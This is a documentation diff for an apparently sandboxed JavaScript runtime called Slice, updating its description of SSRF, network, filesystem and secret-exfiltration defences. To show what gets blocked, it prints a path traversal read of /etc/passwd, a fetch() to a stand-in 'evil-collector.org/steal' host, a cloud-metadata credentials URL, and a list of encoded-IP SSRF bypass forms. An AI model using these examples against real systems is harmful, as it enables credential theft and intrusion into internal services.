@@ -10,7 +10,7 @@ In Node.js and Bun, every `npm` package you install and every script you run inh
 | **Ring 2** | **OCap Filesystem & Subprocess Tokens (`FsCap` & `ExecCap`)** | Unauthorized file read/write, `..` traversal, & unlisted subprocess execution | `FsReadDenied` / `FsWriteDenied` / `ExecDenied` |
 | **Ring 3** | **OCap Network & Env Tokens (`NetCap` & `EnvCap`)** | Unauthorized outbound `fetch()` & `process.env` / `env()` credential harvesting | `NetAccessDenied` / `EnvAccessDenied` |
 | **Ring 4** | **Deterministic CPU Fuel, Memory & Checkpoint Cage** | Infinite loop CPU DoS (`while(true){}`), heap/KV exhaustion, & checkpoint abuse | `CpuFuelExhausted` / `MemoryCeilingExceeded` |
-| **Ring 5** | **Cloud Metadata SSRF Shield, Egress Secret DLP & PKRU Domain Scaffolding** | `169.254.169.254` SSRF, Base64/raw secret exfiltration, & Linux `x86_64` `WRPKRU` register domain switching (`pkey_mprotect` heap tagging not yet wired) | `SSRF_METADATA_BLOCKED` / `EGRESS_SECRET_LEAK_BLOCKED` |
+| **Ring 5** | **Resolved-IP SSRF Shield, Egress Secret DLP & PKRU Domain Scaffolding** | Cloud metadata & private/loopback DNS rebinding SSRF, Base64/raw secret exfiltration, & Linux `x86_64` `WRPKRU` register domain switching (`pkey_mprotect` heap tagging not yet wired) | `NetAccessDenied` (`SSRF_*`, catchable `ERR_SLICE_NET_DENIED`) / `EgressSecretLeakBlocked` (fatal) |
 
 This chapter shows you how to configure and test every security control in your applications.
 
@@ -49,9 +49,9 @@ For example, if you grant `--allow-read=/app/public`, an attacker attempting:
 import * as fs from "node:fs";
 fs.readFileSync("/app/public/../../etc/passwd", "utf8");
 ```
-is immediately blocked with:
+is immediately blocked with a catchable `ERR_SLICE_FS_DENIED` error (recorded in `deniedCapabilities`, promoted to `SandboxViolation::FsReadDenied` if uncaught):
 ```text
-OCap Violation: Compartment 'cli-tenant' lacks filesystem read authority for '/app/public/../../etc/passwd'
+OCap Violation: lacks filesystem read authority for path '/app/public/../../etc/passwd'
 ```
 
 ### 2.4 Copy-on-Write VFS Mutations (Host Disk Preservation)
@@ -78,24 +78,18 @@ Or via CLI:
 ```bash
 slice run ./src/webhook.ts --allow-net=api.stripe.com:443,127.0.0.1:18095
 ```
-If your code (or a compromised npm dependency) tries to call `await fetch("https://evil-collector.org/steal")`, Slice blocks the request before DNS resolution and traps with `NetAccessDenied`.
+If your code (or a compromised npm dependency) tries to call `await fetch("https://evil-collector.org/steal")`, Slice blocks the request before DNS resolution and rejects with a catchable `ERR_SLICE_NET_DENIED` error (`OCap Violation: lacks outbound network authority for host 'evil-collector.org:443'`), records it in `deniedCapabilities`, and promotes it to `SandboxViolation::NetAccessDenied` if uncaught.
 
-### 3.2 Wildcard Public Internet (`allow_net = ["*"]`) & Automatic SSRF Protection
-What if you are building a webhook delivery worker or an AI browsing agent that needs to `fetch()` arbitrary user-supplied public URLs (`--allow-net=*`)?
+### 3.2 Built-In Resolved-IP SSRF Protection & `allow_private_networks` Opt-In
+In Node.js, Bun, or Deno (`deno run --allow-net`), if a user passes `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or a granted public hostname whose DNS points to `127.0.0.1` or `10.0.0.15:6379`, your server will reach cloud instance credentials or internal services (Server-Side Request Forgery / SSRF).
 
-In Node.js, Bun, or Deno (`deno run --allow-net`), if a user passes `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `http://10.0.0.15:6379/`, your server will happily fetch your cloud instance's IAM credentials or internal Redis server (Server-Side Request Forgery / SSRF).
-
-**In Slice, the SSRF Shield is always active across every DNS resolution and redirect hop:**
-1. **Cloud Metadata Endpoints Are Unconditionally Blocked (Even Under `--allow-net=*`):**
-   - `169.254.169.254` (AWS EC2 / GCP / Azure IMDS)
-   - `169.254.170.2` (AWS ECS Task Metadata)
-   - `100.100.100.200` (Alibaba Cloud Metadata)
-   - `[fd00:ec2::254]` (IPv6 AWS IMDS)
-   - `metadata.google.internal` & `metadata.goog` (GCP Metadata DNS)
-2. **Pre-Connect DNS Resolved-IP Firewall (`resolve_and_verify_socket_addrs`):**
-   - Before opening any TCP or TLS socket, Slice resolves the hostname and inspects **every returned `SocketAddr` (both IPv4 and IPv6, including IPv4-mapped IPv6 addresses like `::ffff:127.0.0.1` and `::ffff:169.254.169.254`)**.
-   - Even if an attacker configures a public DNS domain (`evil.example.com`) with an `A` or `AAAA` record pointing to `127.0.0.1`, `10.0.0.1`, or `169.254.169.254` (DNS rebinding), Slice blocks the connection before `connect()` and traps with `SSRF_DNS_REBIND_BLOCKED` / `SSRF_METADATA_IP_BLOCKED`.
-   - Internal/private endpoints can **only** be reached if you explicitly name that exact `host:port` in `allow_net` (e.g., `--allow-net=*,127.0.0.1:18095`).
+**In Slice, the Resolved-IP SSRF Shield is always active across every outbound protocol (`fetch()`, redirects, `WebSocket`, TCP/TLS sockets, and UDP):**
+1. **Cloud Metadata Endpoints Are Unconditionally Blocked (Even With `allow_private_networks = true`):**
+   - `169.254.169.254` (AWS EC2 / GCP / Azure IMDS), `169.254.170.2` (AWS ECS), `169.254.170.23` / `[fd00:ec2::23]` (AWS EKS Pod Identity), `168.63.129.16` (Azure WireServer), `100.100.100.200` (Alibaba Cloud), `[fd00:ec2::254]` (AWS IPv6 IMDS), and `metadata.google.internal` / `metadata.goog` (GCP Metadata DNS).
+2. **Pre-Connect DNS Resolved-IP Firewall (`resolve_and_verify_ssrf_socket_addrs`):**
+   - Before opening any TCP, TLS, WebSocket, or UDP socket, Slice resolves DNS once, validates **every returned `SocketAddr` (IPv4 and IPv6, including IPv4-mapped IPv6 `::ffff:127.0.0.1`, NAT64, SIIT, 6to4, and Teredo)**, and connects directly to the validated `SocketAddr` (preventing DNS rebinding).
+   - **All DNS hostnames** (whether granted explicitly in `allow_net` or matched via `allow_net = ["*"]`) are blocked from connecting to loopback (`127.0.0.0/8`, `::1`), RFC 1918 private (`10/8`, `172.16/12`, `192.168/16`), IPv6 ULA (`fc00::/7`), link-local (`169.254/16`, `fe80::/10`), CGNAT (`100.64/10`), unspecified (`0.0.0.0/8`, `::`), broadcast, multicast, or special-use ranges by default (`SSRF_PRIVATE_IP_BLOCKED`, catchable `ERR_SLICE_NET_DENIED`).
+   - Internal endpoints can be reached only by: (a) naming the exact literal IP in `allow_net` (e.g. `127.0.0.1:18095`), (b) naming `localhost:<port>` in `allow_net` (restricted strictly to loopback IPs), or (c) opting into private DNS resolution via `allow_private_networks = true` in `slice.toml` / `--allow-private-networks` / `SLICE_ALLOW_PRIVATE_NETWORKS=1` (monotonically attenuated in child sandboxes; cloud metadata remains unconditionally blocked).
 3. **Zero-Trust Hop-by-Hop Redirect Guard (`301` / `302` / `303` / `307` / `308`):**
    - When an allowed upstream server returns a `30x` redirect (`redirect: "follow"`), Slice re-verifies the target `Location` URL's host, port, and DNS-resolved IP against `allow_net` and the SSRF firewall **before following the hop** (up to 5 hops).
    - If a redirect crosses origins (different scheme, host, or port), Slice automatically strips sensitive `Authorization`, `Cookie`, and `Proxy-Authorization` headers so credentials are never leaked to a redirect target.
@@ -158,15 +152,15 @@ const leakedBase64 = Buffer.from("sk_live_99887766", "utf8").toString("base64");
 
 // Attempting to print, fetch(), or ws.send() the Base64-encoded secret immediately traps!
 console.log("Diagnostic trace:", leakedBase64);
-// -> Traps with: OCap Violation: Compartment '...' lacks environment variable authority for 'EGRESS_SECRET_LEAK_BLOCKED'
+// -> Traps with: Egress DLP Violation (EGRESS_SECRET_LEAK_BLOCKED): blocked from exfiltrating a registered audit secret
 ```
 
 ### 4.3 Hardened HTTP/1.1 & RFC 6455 WebSocket Wire-Protocol Defenses
 Both the outbound `fetch()` / `WebSocket` client engine and the inbound `slice serve` HTTP/WebSocket server enforce strict wire-level security guards:
-- **Non-Canonical IP, Cloud Metadata & Special-Use CIDR SSRF Blocking:** Cloud metadata endpoints (AWS/GCP/Azure/DO `169.254.169.254`, AWS ECS `169.254.170.2`, AWS EKS Pod Identity `169.254.170.23` / `fd00:ec2::23`, Azure WireServer `168.63.129.16`, Alibaba `100.100.100.200`, AWS IPv6 `fd00:ec2::254`, and `metadata.google.internal`) are unconditionally blocked. Under wildcard `allow_net = ["*"]`, the SSRF shield also blocks octal (`0177.0.0.1`), leading-zero non-octal (`127.0.0.08`, `0169.0254.0169.0254`), hexadecimal (`0x7f.0.0.1`), integer/dword (`2130706433`), shorthand (`127.1`, `169.254.43518`), and percent-encoded (`%31%36%39...`) IPv4 encodings alongside percent-decoded authority delimiters (`%40`, `%2f`, `%00`), `:0` / invalid ports, `0.0.0.0/8`, RFC 1918, loopback, link-local (`169.254.0.0/16`, `fe80::/10`), CGNAT (`100.64.0.0/10`), benchmark (`198.18.0.0/15`), IETF protocol (`192.0.0.0/24`), multicast (`224.0.0.0/4`, `ff00::/8`), IPv6 Unique Local (`fc00::/7`), NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`), SIIT (`::ffff:0:0/96`), and Teredo (`2001:0000::/32`) ranges.
+- **Non-Canonical IP, Cloud Metadata & Special-Use CIDR SSRF Blocking:** Cloud metadata endpoints (AWS/GCP/Azure/DO `169.254.169.254`, AWS ECS `169.254.170.2`, AWS EKS Pod Identity `169.254.170.23` / `fd00:ec2::23`, Azure WireServer `168.63.129.16`, Alibaba `100.100.100.200`, AWS IPv6 `fd00:ec2::254`, and `metadata.google.internal`) are unconditionally blocked. For all DNS hostnames by default (both explicit grants and `allow_net = ["*"]`, unless `allow_private_networks = true` or explicit literal IP / `localhost` loopback), the SSRF shield blocks octal (`0177.0.0.1`), leading-zero non-octal (`127.0.0.08`, `0169.0254.0169.0254`), hexadecimal (`0x7f.0.0.1`), integer/dword (`2130706433`), shorthand (`127.1`, `169.254.43518`), and percent-encoded (`%31%36%39...`) IPv4 encodings alongside percent-decoded authority delimiters (`%40`, `%2f`, `%00`), `:0` / invalid ports, `0.0.0.0/8`, RFC 1918, loopback, link-local (`169.254.0.0/16`, `fe80::/10`), CGNAT (`100.64.0.0/10`), benchmark (`198.18.0.0/15`), IETF protocol (`192.0.0.0/24`), multicast (`224.0.0.0/4`, `ff00::/8`), IPv6 Unique Local (`fc00::/7`), deprecated site-local (`fec0::/10`), NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`), SIIT (`::ffff:0:0/96`), and Teredo (`2001:0000::/32`) ranges.
 - **RFC 9110 `tchar` Header & CRLF Injection Prevention:** Outbound and inbound header names are validated against a compile-time RFC 9110 `tchar` lookup table, and header values / request targets reject `\r`, `\n`, `\0`, and ASCII control characters to prevent HTTP Request/Response Splitting.
 - **RFC 9112 Request Smuggling (`CL.TE` / `TE.CL`) & Chunked Arithmetic Guards:** `slice serve` immediately rejects requests containing both `Transfer-Encoding` and `Content-Length` or conflicting duplicate `Content-Length` headers with `400 Bad Request` (`Connection: close`), validates chunked hex sizes with checked arithmetic, and caps inbound bodies at `4 MB` (`413 Payload Too Large`) and headers at 64 fields / 64 KB (`431 Request Header Fields Too Large`).
-- **Tenant-Partitioned Keep-Alive Pool & Outbound Memory Ceilings:** Warm Keep-Alive sockets are keyed by `(tenant_id, is_https, host_port)` so tenants never share an upstream connection, and outbound HTTP responses (`64 KB` max headers, `16 MB` max body) and WebSocket frames (`4 MB` max) are strictly bounded by the active tenant's remaining memory budget (`SandboxViolation::MemoryCeilingExceeded`).
+- **Tenant-Partitioned Keep-Alive Pool & Outbound Memory Ceilings:** Warm Keep-Alive sockets are keyed by `(tenant_id, proxy_key, is_https, allow_private_networks, host_port)` so tenants and policies never share an upstream connection, and outbound HTTP responses (`64 KB` max headers, `16 MB` max body) and WebSocket frames (`4 MB` max) are strictly bounded by the active tenant's remaining memory budget (`SandboxViolation::MemoryCeilingExceeded`).
 
 ### 4.4 5-Ring OCap Subprocess Containment (`node:child_process`, `allow_exec` & `--allow-exec`)
 When CLI tools or AI Code-Mode agents use `node:child_process` (`execFileSync`, `spawnSync`, `execSync`, `spawn`, `exec`, `execFile`), Slice enforces all 5 security rings:
